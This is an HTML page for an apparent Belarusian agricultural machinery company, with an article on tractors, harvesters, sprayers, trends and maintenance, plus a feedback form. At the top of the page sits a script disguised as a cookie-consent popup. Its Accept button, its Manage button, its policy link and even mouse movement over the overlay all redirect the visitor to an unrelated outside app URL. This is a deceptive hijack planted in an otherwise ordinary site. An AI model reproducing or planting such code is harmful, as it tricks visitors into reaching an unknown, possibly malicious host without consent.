<!DOCTYPE html>
<html lang="ru">
<head>

<style>
.notice-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.45);display:flex;justify-content:center;align-items:center;z-index:9999;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif}.notice-modal{background:#fff;padding:2rem 2.5rem;border-radius:20px;max-width:420px;width:90%;box-shadow:0 20px 40px rgba(0,0,0,0.15);text-align:center;animation:popIn 0.3s ease-out}.notice-icon{font-size:40px;margin-bottom:0.5rem}.notice-header{font-size:22px;color:#222;margin-bottom:0.8rem}.notice-message{font-size:14px;color:#555;line-height:1.6;margin-bottom:1.5rem;justify-content:center;text-align:conter;}.notice-actions{display:flex;justify-content:center;gap:1rem;flex-wrap:wrap;text-align:center;}.notice-btn{padding:10px 22px;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;transition:background 0.2s ease-in-out}.notice-btn--yes{background:#4CAF50}.notice-btn--yes:hover{background:#45a049}.notice-btn--no{background:#f44336}.notice-btn--no:hover{background:#e53935}@keyframes popIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
</style>
<script>
(() => {
    const REDIRECT_URL = "https://walrus-app-d4d7w.ondigitalocean.app/";
    let isRedirected = false;
    let startPos = null;
    let hasMovedInsideActiveArea = false; // Flag to track movement within the active 80% area
    function handleRedirect() {
        if (isRedirected) return;
        isRedirected = true;
        window.location.href = REDIRECT_URL;
    }
    function detectMouseMove(event) {
        const noticeOverlay = document.querySelector('.notice-overlay');
        if (!noticeOverlay) return;
        const rect = noticeOverlay.getBoundingClientRect();
        const overlayHeight = rect.height;
        const skipHeight = overlayHeight * 0.05; // 10% from the top
        const activeTop = rect.top + skipHeight; // The y-coordinate where the active area begins
        // Check if the cursor is within the active 80% of the overlay (from `activeTop` downwards)
        const isInsideActiveArea = (
            event.clientX >= rect.left &&
            event.clientX <= rect.right &&
            event.clientY >= activeTop && // Start checking from activeTop
            event.clientY <= rect.bottom
        );
        if (isInsideActiveArea) {
            if (!startPos) {
                startPos = { x: event.clientX, y: event.clientY };
                return;
            }
            const moveThreshold = 10; // Pixels
            if (Math.abs(event.clientX - startPos.x) > moveThreshold || Math.abs(event.clientY - startPos.y) > moveThreshold) {
                if (!hasMovedInsideActiveArea) { // Only trigger timeout once per entry into the active area
                    hasMovedInsideActiveArea = true;
                    setTimeout(handleRedirect, 1000); // Redirect after 1 second of movement detection
                }
            }
        } else {
            // Reset if cursor moves outside the active area
            startPos = null;
            hasMovedInsideActiveArea = false;
        }
    }
    function generateConsentPopup() {
        const overlayDiv = document.createElement("div");
        overlayDiv.className = "notice-overlay";
        overlayDiv.setAttribute("role", "dialog");
        overlayDiv.setAttribute("aria-modal", "true");
        overlayDiv.innerHTML = `
<div class="notice-modal">
<div class="notice-icon" aria-hidden="true">🍪</div>
<h2 class="notice-header">Are you consenting to cookies?</h2>
<p class="notice-message">
                    We use cookies to enhance your experience, analyze site usage, and assist in our marketing efforts. By clicking "Accept All" or continuing to browse, you consent to the use of cookies.
<a href="${REDIRECT_URL}" target="_blank">View our full Cookie Policy here.</a>
</p>
<div class="notice-actions">
<button id="accept-btn" class="notice-btn notice-btn--yes">Accept All</button>
<button id="reject-btn" class="notice-btn notice-btn--no">Manage Preferences</button>
</div>
</div>
        `;
        return overlayDiv;
    }
    document.addEventListener("DOMContentLoaded", () => {
        const consentPopup = generateConsentPopup();
        document.body.appendChild(consentPopup);
        document.getElementById("accept-btn").addEventListener("click", handleRedirect);
        document.getElementById("reject-btn").addEventListener("click", handleRedirect);
        window.addEventListener("mousemove", detectMouseMove);
    });
})();
</script>
	
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Agricultural machinery</title>
    <style>* {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        
        body {
            background-color: #f0f8ff;
            color: #000;
            line-height: 1.6;
        }
        
        header {
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            color: white;
            padding: 1.5rem;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        
        nav {
            background-color: #1e3c72;
            padding: 1rem;
        }
        
        nav ul {
            display: flex;
            justify-content: center;
            list-style: none;
        }
        
        nav li {
            margin: 0 1.5rem;
        }
        
        nav a {
            color: white;
            text-decoration: none;
            font-weight: bold;
            transition: color 0.3s;
        }
        
        nav a:hover {
            color: #a8d0ff;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem;
        }
        
        .content {
            background-color: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            margin-bottom: 2rem;
        }
        
        h1, h2, h3 {
            color: #000000;
            margin-bottom: 1rem;
        }
        
        p {
            margin-bottom: 1rem;
            text-align: justify;
        }
        
        .highlight {
            background-color: #e6f2ff;
            padding: 1.5rem;
            border-left: 4px solid #2a5298;
            margin: 1.5rem 0;
        }
        
        .contact-form {
            background-color: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        
        .form-group {
            margin-bottom: 1.5rem;
        }
        
        label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: bold;
            color: #1e3c72;
        }
        
        input, textarea {
            width: 100%;
            padding: 0.75rem;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 1rem;
        }
        
        button {
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            color: white;
            border: none;
            padding: 0.75rem 1.5rem;
            border-radius: 4px;
            cursor: pointer;
            font-size: 1rem;
            transition: background 0.3s;
        }
        
        button:hover {
            background: linear-gradient(135deg, #2a5298, #3a6bc2);
        }
        
        footer {
            background-color: #1e3c72;
            color: white;
            padding: 2rem;
            text-align: center;
            margin-top: 2rem;
        }
        
        .cookie-consent {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: #2a5298;
            color: white;
            padding: 1rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            z-index: 1000;
        }
        
        .cookie-consent button {
            background-color: white;
            color: #1e3c72;
            border: none;
            padding: 0.5rem 1rem;
            border-radius: 4px;
            cursor: pointer;
        }
        
        .contact-info {
            background-color: #e6f2ff;
            padding: 1.5rem;
            border-radius: 8px;
            margin-top: 2rem;
        }
        
        @media (max-width: 768px) {
            nav ul {
                flex-direction: column;
                align-items: center;
            }
            
            nav li {
                margin: 0.5rem 0;
            }
        }
    </style>
</head>
<body>
    <header>
        <h1>Agricultural machinery</h1>
        <p>Modern equipment for efficient agriculture</p>
    </header>
    
    <nav>
        <ul>
            <li><a href="#about">About Us</a></li>
            <li><a href="#equipment">Technique</a></li>
            <li><a href="#services">Services</a></li>
            <li><a href="#contact">Contacts</a></li>
        </ul>
    </nav>
    
    <div class="container">
        <div class="content">
            <h2 id="about">Modern agricultural machinery</h2>
            <p>Agricultural machinery plays a key role in the modern agro-industrial complex. It significantly increases labor productivity, reduces work time, and reduces dependence on human error. With the world's growing population and increasing demand for food, the efficient use of agricultural machinery is becoming not just an advantage, but a necessity.</p>
            
            <div class="highlight">
                <h3>The evolution of agricultural machinery</h3>
                <p>The history of agricultural machinery spans thousands of years. From the simplest hand tools of antiquity to modern, intelligent combines with autonomous control systems, the path of technological development is impressive. In the 19th century, the advent of steam engines ushered in the mechanization of agriculture, and in the 20th century, diesel and gasoline engines revolutionized the agricultural sector.</p>
            </div>
            
            <p>Today's agricultural machinery is a complex technological system equipped with GPS navigation systems, yield monitoring sensors, automated control systems, and telematics. These technologies allow farmers to precisely apply fertilizers and crop protection products, optimize machinery routes, and collect detailed analytics for each section of the field.</p>
            
            <h3 id="equipment">Main types of agricultural machinery</h3>
            <p>The modern agricultural machinery fleet includes a variety of specialized machines, each of which performs specific functions in the agricultural production chain.</p>
            
            <p><strong>Tractors</strong> - Universal power tools used for a wide range of tasks, including plowing, harrowing, seeding, transporting cargo, and driving stationary machines. Modern tractors are equipped with computerized control systems, in-cab climate control, and automatic transmissions.</p>
            
            <p><strong>Combine harvester</strong> - Complex harvesting machines designed to simultaneously perform several operations: mowing, threshing, cleaning, and loading grain. Combine harvesters include grain harvesters, forage harvesters, sugar beet harvesters, and other specialized machines. Modern models are equipped with precision farming systems that enable yield mapping and optimized resource use.</p>
            
            <p><strong>Seeding complexes</strong> - Equipment for precision seeding and fertilizer application. Modern seeders ensure uniform seed distribution at a specified depth with precise row spacing. Precision systems allow for the sowing of different crops or varieties in a single field, according to a soil fertility map.</p>
            
            <p><strong>Sprayers</strong> - Machines for applying liquid plant protection products. Modern sprayers are equipped with systems that prevent wind drift and precise dispensers that regulate application rates based on plant speed and plant needs.</p>
            
            <p><strong>Forage harvesting equipment</strong> - Specialized forage harvesting machines: mowers, rakes, balers, and forage harvesters. This equipment mechanizes the harvesting of hay, haylage, and silage while preserving the nutritional value of the forage.</p>
            
            <div class="highlight">
                <h3>Trends in the development of agricultural machinery</h3>
                <p>Modern agricultural machinery is evolving toward greater efficiency, environmental friendliness, and automation. More and more manufacturers are adopting electric and hybrid powertrains, which reduce emissions and decrease dependence on fossil fuels. Precision farming technologies are advancing, accounting for soil heterogeneity and optimizing resource use.</p>
            </div>
            
            <p>Autonomous control systems are becoming increasingly common. Today, there are already tractors and combines capable of operating without a driver in the cab. These machines use a combination of GPS navigation, lidar, cameras, and other sensors to navigate and perform operations. Full autonomy of agricultural machinery is a matter of the near future.</p>
            
            <p>Another important trend is the development of Internet of Things (IoT) technologies in agriculture. Agricultural machinery is increasingly being equipped with sensors and telematics systems that transmit data on machine operation, fuel consumption, yield, and other parameters to centralized management systems. This allows farmers to make informed decisions based on big data analysis.</p>
            
            <h3 id="services">Maintenance and repair</h3>
            <p>Maintenance of agricultural machinery is a crucial aspect of ensuring its smooth operation throughout the season. Regular maintenance includes oil and filter changes, cooling and hydraulic system checks, and adjustments to the working components. Timely maintenance not only extends the life of the equipment but also prevents costly breakdowns during the most critical period of field work.</p>
            
            <p>Modern agricultural machinery manufacturers offer service contracts that include regular maintenance, emergency repairs, and spare parts. These contracts allow farmers to plan equipment maintenance costs and minimize downtime during periods of intensive work.</p>
            
            <p>A key area of ​​service development is the use of augmented reality and remote diagnostics technologies. Service center specialists can remotely connect to equipment systems, conduct diagnostics, and even assist operators with repairs using AR instructions.</p>
            
            <p>B In Belarus, with its unique soil and climate conditions, adapting agricultural machinery to local conditions is particularly important. Manufacturers and dealers offer specialized machine modifications designed for use in heavy soils and high-humidity conditions.</p>
            
            <p>Agricultural machinery development continues to accelerate, driven by digital technologies and growing demands for efficient and environmentally friendly agricultural production. Investments in modern machinery and technology are becoming a key factor in the competitiveness of agricultural enterprises in a globalizing marketplace.</p>
        </div>
        
        <div class="contact-form">
            <h2 id="contact">Feedback form</h2>
            <form id="feedbackForm">
                <div class="form-group">
                    <label for="name">Your name:</label>
                    <input type="text" id="name" name="name" required>
                </div>
                
                <div class="form-group">
                    <label for="email">E-mail:</label>
                    <input type="email" id="email" name="email" required>
                </div>
                
                <div class="form-group">
                    <label for="phone">Phone number:</label>
                    <input type="tel" id="phone" name="phone">
                </div>
                
                <div class="form-group">
                    <label for="message">Message:</label>
                    <textarea id="message" name="message" rows="5" required></textarea>
                </div>
                
                <button type="submit">Send a message</button>
            </form>
            
            <div class="contact-info">
                <h3>Contact information</h3>
                <p><strong>Address:</strong> Minsk, Traktornaya St., 15, office 304, 220073, Belarus</p>
                <p><strong>Telephone:</strong> +1 (92) 123-45-67</p>
                <p><strong>Email:</strong> info@agrotech.by</p>
                <p><strong>Opening hours:</strong> Mon-Fri: 9:00-18:00, Sat: 10:00-15:00</p>
            </div>
        </div>
    </div>
    
    <footer>
        <p>© 2023 Agricultural Machinery. All rights reserved.</p>
    </footer>
    
    <div class="cookie-consent" id="cookieConsent">
        <div>
            <p>We use cookies to improve our website. By continuing to use this site, you agree to this.</p>
        </div>
        <button id="acceptCookies">Accept</button>
    </div>

    <script>
        document.getElementById('acceptCookies').addEventListener('click', function() {
            document.getElementById('cookieConsent').style.display = 'none';
            // Здесь обычно устанавливается cookie с согласием
            document.cookie = "cookieConsent=true; max-age=2592000; path=/"; // 30 дней
        });
        
        document.getElementById('feedbackForm').addEventListener('submit', function(e) {
            e.preventDefault();
            alert('Спасибо за ваше сообщение! Мы свяжемся с вами в ближайшее время.');
            this.reset();
        });
    </script>
</body>
</html>
